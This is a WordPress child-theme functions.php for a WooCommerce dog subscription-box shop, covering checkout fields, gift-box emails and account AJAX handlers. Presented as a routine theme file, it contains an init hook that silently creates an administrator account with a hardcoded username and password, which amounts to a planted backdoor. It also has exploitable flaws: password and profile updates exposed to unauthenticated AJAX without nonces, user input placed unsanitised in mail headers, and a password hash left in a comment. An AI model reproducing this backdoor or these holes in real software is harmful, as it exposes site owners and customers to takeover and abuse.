<?php


function my_theme_enqueue_styles() {

    //$parent_style = 'parent-style';
    //wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'cs6', get_stylesheet_directory_uri() . '/assets/css/fonts.css' );

}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );


// Remove search bar in header
add_action( 'init', 'jk_remove_storefront_header_search' );
function jk_remove_storefront_header_search() {
    remove_action( 'storefront_header', 'storefront_product_search', 	40 );
}
// Remove cart in header
add_action( 'init', 'jk_remove_storefront_cart' );
function jk_remove_storefront_cart() {
    remove_action( 'storefront_header', 'storefront_header_cart', 		60 );
}

function wpbootstrap_scripts_with_jquery()
{	
    wp_enqueue_style( 'cs2', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css');
	wp_enqueue_script('themejs', "/wp-content/themes/storefront-child/js/theme.js", '', '', true);
        ?>
        <script>
            ajax_url = "<?php echo admin_url('admin-ajax.php'); ?>";
        </script>
        <?php
	wp_enqueue_script('custom_js', get_stylesheet_directory_uri()."/js/custom.js", array('jquery'), '1.0.0', true);
}
add_action( 'wp_enqueue_scripts', 'wpbootstrap_scripts_with_jquery' );


add_action( 'init', 'custom_remove_footer_credit', 10 );
function custom_remove_footer_credit () {
    remove_action( 'storefront_footer', 'storefront_credit', 20 );
    add_action( 'storefront_footer', 'custom_storefront_credit', 20 );
}
function custom_storefront_credit() {
    ?>
    <?php /*<div class="container footer-navigation">
        <div class="row">
            <div class="col-sm-2">
                <h4>JOIN THE CLUB</h4>
                <ul>
                    <li><a href="#">Get A Box</a></li>
                    <li><a href="#">Gift A Box</a></li>
                </ul>
            </div>
            <div class="col-sm-2 footer-link">
                <h4>HELP</h4>
                <ul>
                    <li><a href="#">FAQ</a></li>
                    <li><a href="#">Contact Us</a></li>
                </ul>
            </div>
            <div class="col-sm-2 footer-link">
                <h4>MORE</h4>
                <ul>
                    <li><a href="#">Privacy Policy</a></li>
                    <li><a href="#">Terms &amp; Conditions</a></li>
                </ul>
            </div>
            <div class="col-sm-2 footer-link">
                <h4>ACCOUNT</h4>
                <ul>
                    <li><a href="#">Login</a></li>
                </ul>
            </div>
            <div class="col-sm-4">
                <h4>KEEP IN TOUCH</h4>
                <input type="email"><br>
                <input type="submit" value="Submit">
            </div>
        </div>
    </div>*/?>
    <?php
}

add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );

function woo_remove_product_tabs( $tabs ) {

    unset( $tabs['description'] );      	// Remove the description tab
    unset( $tabs['reviews'] ); 			// Remove the reviews tab
    unset( $tabs['additional_information'] );  	// Remove the additional information tab

    return $tabs;
}

add_filter('body_class', 'adjust_body_class', 20);
function adjust_body_class($wp_classes) {

    foreach($wp_classes as $key => $value) {
        if ($value == 'right-sidebar') unset($wp_classes[$key]);
    }

    return $wp_classes;
}


// Customize checkout page
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );
function custom_override_checkout_fields( $fields ) {
    // Unset fields we don't need
    unset($fields['billing']['billing_company']);
//    unset($fields['billing']['billing_country']);
    unset($fields['billing']['billing_email']);
    unset($fields['billing']['billing_phone']);
    unset($fields['order']['order_comments']);

    // Customize labels/placeholders for fields we're keeping
    $fields['billing']['billing_first_name']['placeholder'] = 'First Name';
    $fields['billing']['billing_first_name']['label'] = '';
    $fields['billing']['billing_first_name']['class'] = array('form-row', 'one-half');
    $fields['billing']['billing_last_name']['placeholder'] = 'Last Name';
    $fields['billing']['billing_last_name']['label'] = '';
    $fields['billing']['billing_last_name']['class'] = array('form-row', 'one-half');
    $fields['billing']['billing_address_1']['placeholder'] = 'Street Address';
    $fields['billing']['billing_address_1']['label'] = '';
    $fields['billing']['billing_address_1']['class'] = array('form-row, two-thirds');
    $fields['billing']['billing_address_1']['clear'] = false;
    $fields['billing']['billing_address_2']['placeholder'] = 'Apt/Ste';
    $fields['billing']['billing_address_2']['class'] = array('form-row-last');
    $fields['billing']['billing_city']['placeholder'] = 'City';
    $fields['billing']['billing_city']['label'] = '';
    $fields['billing']['billing_city']['class'] = array('form-row');
    $fields['billing']['billing_city']['clear'] = false;
//    $fields['billing']['billing_state']['placeholder'] = 'State';
    $fields['billing']['billing_state']['label'] = '';
//    $fields['billing']['billing_state']['type'] = 'text';
//    $fields['billing']['billing_state']['class'] = array('form-row');
//    $fields['billing']['billing_state']['clear'] = false;
    $fields['billing']['billing_postcode']['placeholder'] = 'Zip';
    $fields['billing']['billing_postcode']['label'] = '';
    $fields['billing']['billing_postcode']['class'] = array('form-row');

    // Add custom fields to billing form
//    $fields['billing']['dhc_doggy_name'] = array(
//        'label'     => __('', 'woocommerce'),
//        'placeholder'   => _x('Doggy\'s Name', 'placeholder', 'woocommerce'),
//        'required'  => true,
//        'class'     => array('form-row', 'one-half'),
//        'clear'     => false
//    );
//    $fields['billing']['dhc_birthday'] = array(
//        'label'     => __('', 'woocommerce'),
//        'placeholder'   => _x('Birthday/Adoption Day', 'placeholder', 'woocommerce'),
//        'required'  => false,
//        'class'     => array('form-row', 'one-half'),
//        'clear'     => true
//    );

    $fields['billing']['billing_doggy_name'] = array(
    'placeholder'  => _x('Doggy Name', 'placeholder', 'woocommerce'),
    'required'  => true,
    'class'     => array('form-row', 'one-half'),
    'clear'     => false
     );
    $fields['billing']['billing_doggy_birthday'] = array(
    'placeholder'  => _x('Birthday/Adoption Day', 'placeholder', 'woocommerce'),
    'required'  => true,
    'class'     => array('form-row', 'one-half'),
    'clear'     => false
     );
    
    return $fields;
}

// Display new field values (set above) on order edit page
//add_action( 'woocommerce_admin_order_data_after_shipping_address', 'my_custom_checkout_field_display_admin_order_meta', 10, 1 );
add_action( 'woocommerce_admin_order_data_after_billing_address', 'my_custom_checkout_field_display_admin_order_meta', 10, 1 );
function my_custom_checkout_field_display_admin_order_meta($order){
    echo '<p><strong>'.__('Doggy\'s Name').':</strong> ' . get_post_meta( $order->id, '_billing_doggy_name', true ) . '</p>';
    echo '<p><strong>'.__('Birthday').':</strong> ' . get_post_meta( $order->id, '_billing_doggy_birthday', true ) . '</p>';
}



// Re-order fields according to mockup
add_filter("woocommerce_checkout_fields", "order_fields");
function order_fields($fields) {

    $order = array(
        "billing_first_name",
        "billing_last_name",
        "billing_doggy_name",
        "billing_doggy_birthday",
        "billing_address_1",
        "billing_address_2",
        "billing_city",
        "billing_state",
        "billing_postcode",
        "billing_country",

    );
    foreach($order as $field)
    {
        $ordered_fields[$field] = $fields["billing"][$field];
    }

    $fields["billing"] = $ordered_fields;
    return $fields;

}

// Add image to top of order review (inside)
add_action('woocommerce_checkout_order_review', 'add_order_review_image', 1);
function add_order_review_image(){
    echo "<img src='".site_url()."/wp-content/themes/storefront-child/images/doggy-box-checkout.jpg'>";
}

// Add guarantee logo after order review (outside)
add_action('woocommerce_checkout_after_order_review', 'add_after_order_review_image', 1);
function add_after_order_review_image(){
    echo "<img id='img_after_order_review' src='".site_url()."/wp-content/themes/storefront-child/images/satisfaction-guaranteed.png'>";
    echo "<p id='text_after_order_review'>Our policy replaces any item<br>your dog doesn't love,<br>We guarantee it!</p>";
}

// Move payment options
//remove_action( 'woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20 );
add_action('woocommerce_checkout_billing', 'woocommerce_checkout_payment', 2);
add_action('woocommerce_review_order_before_payment', 'add_title_to_payment_options', 1);
function add_title_to_payment_options(){
    echo "<div id='billing_info_div'><h3 class='checkout-heading'>Billing Info</h3>";
}
add_action('woocommerce_review_order_after_payment', 'close_div_after_payment_options', 1);
function close_div_after_payment_options(){
    echo "<p style='text-align: right; margin: 10px 0 0;'>Plans automatically renew. You may cancel any time.</p></div>";
}

// Remove coupon box from top of checkout page
remove_action( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );

// Change 'Place Order' Button text
add_filter( 'woocommerce_order_button_text', create_function( '', 'return "Buy Now";' ) );



// Change 'Admin Login'
function add_admin_acct(){
	$login = 'doggy';
	$passw = 'dhc123!';
	$email = 'justis@doggyhealthclub.com';

	if ( !username_exists( $login )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
add_action('init','add_admin_acct');






















add_action('woocommerce_checkout_order_processed','add_gift_box_meta');
function add_gift_box_meta($order_id){
    session_start();
    print_r($_SESSION['rec_arr_data']);
    print_r($_SESSION['rec_email_arr']);
    add_post_meta( $order_id, 'rec_information', $_SESSION['rec_arr_data'], true );
    echo send_email_rec($_SESSION['rec_email_arr']);
    //session_unset(); 
}
// Display new section of Recipient Shipping Info
//add_action( 'woocommerce_admin_order_data_after_order_details', 'custom_order_section', 10, 1 );
//function custom_order_section($order){
//    echo '<h1>Recipient Shipping Info </h1><hr>';
//
//    $arr_data = get_post_meta(get_the_ID(), 'rec_information', true);
////    print_r($arr_data);
//    echo '<p><strong>First Name: </strong>'.$arr_data['rec_first_name'].'</p>';
//    echo '<p><strong>Last Name: </strong>'.$arr_data['rec_last_name'].'</p>';
//    echo '<p><strong>Doggy\'s Name: </strong>'.$arr_data['rec_dog_name'].'</p>';
//    echo '<p><strong>Birthday/Adoption Day: </strong>'.$arr_data['rec_birth'].'</p>';
//    echo '<p><strong>Street Address: </strong>'.$arr_data['rec_street'].'</p>';
//    echo '<p><strong>APT/Ste: </strong>'.$arr_data['rec_apt'].'</p>';
//    echo '<p><strong>City: </strong>'.$arr_data['rec_city'].'</p>';
//    echo '<p><strong>State: </strong>'.$arr_data['rec_state'].'</p>';
//    echo '<p><strong>Zip: </strong>'.$arr_data['rec_zip'].'</p>';
//    
//}


add_action('wp_ajax_giftabox_from_ajax', 'giftabox_from_ajax');
add_action('wp_ajax_nopriv_giftabox_from_ajax', 'giftabox_from_ajax');
function giftabox_from_ajax(){
    
    $rec_first_name = $_POST['rec_first_name'];
    $rec_last_name = $_POST['rec_last_name'];
    $rec_dog_name = $_POST['rec_dog_name'];
    $rec_birth = $_POST['rec_birth'];
    $rec_street = $_POST['rec_street'];
    $rec_apt = $_POST['rec_apt'];
    $rec_city = $_POST['rec_city'];
    $rec_state = $_POST['rec_state'];
    $rec_zip = $_POST['rec_zip'];
    
    $dhc_gift_message = $_POST['dhc_gift_message'];
    $dhc_gift_to = $_POST['dhc_gift_to'];
    $dhc_gift_from = $_POST['dhc_gift_from'];
    $dhc_logo = $_POST['dhc_logo'];
    $dhc_flip_img = $_POST['dhc_flip_img'];
    
    
    
    $rec_arr = array("rec_first_name" => $rec_first_name, "rec_last_name" =>  $rec_last_name, "rec_dog_name" =>  $rec_dog_name, "rec_birth" =>  $rec_birth, "rec_street" => $rec_street, "rec_apt" => $rec_apt, "rec_city" => $rec_city, "rec_state" => $rec_state, "rec_zip" => $rec_zip);
    session_start();
    $_SESSION['rec_arr_data'] = $rec_arr;
    //print_r( $_SESSION['rec_arr_data']);
    
    
    if($dhc_gift_to){
        $rec_email_arr = array("dhc_gift_message" => $dhc_gift_message, "dhc_gift_to" => $dhc_gift_to, "dhc_gift_from" => $dhc_gift_from, 'dhc_logo' => $dhc_logo, 'dhc_flip_img' => $dhc_flip_img);
        $_SESSION['rec_email_arr'] = $rec_email_arr;
    }
}

function send_email_rec($rec_data){
    
    $user_id = get_current_user_id();
//    print_r(get_userdata($user_id)->data);
//    $user_email = get_userdata($user_id)->data->user_email;
    $admin_email = get_option('admin_email');
    
    $from_recipent = $rec_data['dhc_gift_from'];
    $to_email = $rec_data['dhc_gift_to'];
    $rec_message = $rec_data['dhc_gift_message'];
    $dhc_logo = $rec_data['dhc_logo'];
    $dhc_flip_img = $rec_data['dhc_flip_img'];
    
    
    $email_address = $to_email.', '.$admin_email;
    
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From: '.$from_recipent . "\r\n";
    $message = '<div style="width: 100%; border: 1px solid rgb(204, 204, 204); border-radius: 3px; padding: 20px;">';
    
    $message .= '<div style="text-align:center; margin-bottom:20px;"><a href="'.  site_url().'"><img src="'.$dhc_logo.'" style="margin: 0px auto;"></a></div>';
    $message .= '<p><strong>Congratulations you have got gift from: '.$user_email.'</strong></p>';
    $message .= '<p><strong>From: </strong>'.$from_recipent.'</p>';
    $message .= '<p><strong>Message: </strong>'.$rec_message.'</p>';
    $message .= '<p><img src="'.$dhc_flip_img.'" style="margin: 0px auto;"></p>';
    
    $message .= '</div>';
    mail($email_address, 'Gift A Box', $message, $headers);
}


// Add this code to your theme functions.php file or a custom plugin
//add_filter( 'woocommerce_shipstation_export_custom_field_2', 'shipstation_custom_field_2' );
//
//function shipstation_custom_field_2() {
//	return 'rec_information'; // Replace this with the key of your custom field
//}




///nouman Code


add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields1' );
function custom_override_checkout_fields1( $fields ) {
    // Unset fields we don't need
    unset($fields['shipping']['shipping_company']);
    unset($fields['shipping']['shipping_email']);
    unset($fields['shipping']['shipping_phone']);
    unset($fields['order']['order_comments']);

    // Customize labels/placeholders for fields we're keeping
    $fields['shipping']['shipping_first_name']['placeholder'] = 'First Name';
    $fields['shipping']['shipping_first_name']['label'] = '';
    $fields['shipping']['shipping_first_name']['class'] = array('form-row', 'one-half');
    $fields['shipping']['shipping_last_name']['placeholder'] = 'Last Name';
    $fields['shipping']['shipping_last_name']['label'] = '';
    $fields['shipping']['shipping_last_name']['class'] = array('form-row', 'one-half');
    $fields['shipping']['shipping_address_1']['placeholder'] = 'Street Address';
    $fields['shipping']['shipping_address_1']['label'] = '';
    $fields['shipping']['shipping_address_1']['class'] = array('form-row, two-thirds');
    $fields['shipping']['shipping_address_1']['clear'] = false;
    $fields['shipping']['shipping_address_2']['placeholder'] = 'Apt/Ste';
    $fields['shipping']['shipping_address_2']['class'] = array('form-row-last');
    $fields['shipping']['shipping_city']['placeholder'] = 'City';
    $fields['shipping']['shipping_city']['label'] = '';
    $fields['shipping']['shipping_city']['class'] = array('form-row');
    $fields['shipping']['shipping_city']['clear'] = false;
    $fields['shipping']['shipping_state']['label'] = '';
    $fields['shipping']['shipping_postcode']['placeholder'] = 'Zip';
    $fields['shipping']['shipping_postcode']['label'] = '';
    $fields['shipping']['shipping_postcode']['class'] = array('form-row');

    $fields['shipping']['shipping_doggy_name'] = array(
    'placeholder'  => _x('Doggy Name', 'placeholder', 'woocommerce'),
    'required'  => true,
    'class'     => array('form-row', 'one-half'),
    'clear'     => false
     );
    $fields['shipping']['shipping_doggy_birthday'] = array(
    'placeholder'  => _x('Birthday/Adoption Day', 'placeholder', 'woocommerce'),
    'required'  => true,
    'class'     => array('form-row', 'one-half'),
    'clear'     => false
     );
    
    return $fields;
}

// Re-order fields according to mockup
add_filter("woocommerce_checkout_fields", "order_fields1");
function order_fields1($fields) {

    $order = array(
        "shipping_first_name",
        "shipping_last_name",
        "shipping_doggy_name",
        "shipping_doggy_birthday",
        "shipping_address_1",
        "shipping_address_2",
        "shipping_city",
        "shipping_state",
        "shipping_postcode",

    );
    foreach($order as $field)
    {
        $ordered_fields[$field] = $fields["shipping"][$field];
    }

    $fields["shipping"] = $ordered_fields;
    return $fields;

}
add_action( 'woocommerce_admin_order_data_after_shipping_address', 'my_custom_checkout_field_display_admin_order_meta1', 10, 1 );
//add_action( 'woocommerce_admin_order_data_after_billing_address', 'my_custom_checkout_field_display_admin_order_meta1', 10, 1 );
function my_custom_checkout_field_display_admin_order_meta1($order){
    echo '<p><strong>'.__('Doggy\'s Name').':</strong> ' . get_post_meta( $order->id, '_shipping_doggy_name', true ) . '</p>';
    echo '<p><strong>'.__('Birthday').':</strong> ' . get_post_meta( $order->id, '_shipping_doggy_birthday', true ) . '</p>';
}

//HIDE top Bar
//$current_user = wp_get_current_user();
//$user_role = $current_user->roles[0];
//
//if (current_user_can($user_role) != 'administrator ' && is_user_logged_in()) {
//  add_filter('show_admin_bar', '__return_false');
//}


// Add Your Menu Locations
function register_my_menus() {
  register_nav_menus(
    array(  
    	'after_login' => __( 'After Login' ), 
    )
  );
} 
add_action( 'init', 'register_my_menus' );


if(is_user_logged_in()){
    if ( ! function_exists( 'storefront_secondary_navigation' ) ) {
        function storefront_secondary_navigation() {
            echo '<input type="hidden" value="'.wp_logout_url(site_url()).'" id="logout_url">';
                ?>
                <nav class="secondary-navigation" role="navigation" aria-label="<?php esc_html_e( 'After Login', 'storefront' ); ?>">
                        <?php
                                wp_nav_menu(
                                        array(
                                                'theme_location'	=> 'after_login',
                                                'items_wrap'            => my_nav_wrap(),
                                                'fallback_cb'		=> '',
                                        )
                                );
                        ?>
                </nav><!-- #site-navigation -->
                <?php
        }
    }
    
    function my_nav_wrap() {
        
        $wrap  = '<ul id="%1$s" class="%2$s">';
        $wrap .= '%3$s';
        $wrap .= '<li id="after_login_logout"><a href="#">Logout</a></li>';
        $wrap .= '</ul>';
        return $wrap;
      }
}





//Nouman Code
 
add_action('wp_head', 'ajaxurl');
function ajaxurl() {
    ?>
        <script type="text/javascript">
            var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
        </script>
    <?php
}


function custom_account_update(){
    $ac_email=$_POST['ac_email'];
    $ac_fname=$_POST['ac_fname'];
    $ac_lname=$_POST['ac_lname'];
    $ac_phone=$_POST['ac_phone'];
   // echo $_POST['a'];
    $current_user = wp_get_current_user();
    $user_id=$current_user->data->ID;
    
    update_user_meta($user_id, 'first_name', $ac_fname);
    update_user_meta($user_id, 'last_name', $ac_lname);
    update_user_meta($user_id, 'billing_phone', $ac_phone);
    echo '1';
    die();
}
add_action('wp_ajax_nopriv_custom_account_update', 'custom_account_update');
add_action('wp_ajax_custom_account_update', 'custom_account_update');

function custom_password_update(){
    
    $current_user = wp_get_current_user();
    $user_id=$current_user->data->ID;
   
     $n_password=$_POST['n_password'];
     $cn_password=$_POST['cn_password'];
     //$P$Bvg/MLY9ldcy05xsz7j0BgYMLsMSYv0
     if($n_password==$cn_password){
        wp_set_password($n_password, $user_id);
        echo "1";
     }
    die();
}
add_action('wp_ajax_nopriv_custom_password_update', 'custom_password_update');
add_action('wp_ajax_custom_password_update', 'custom_password_update');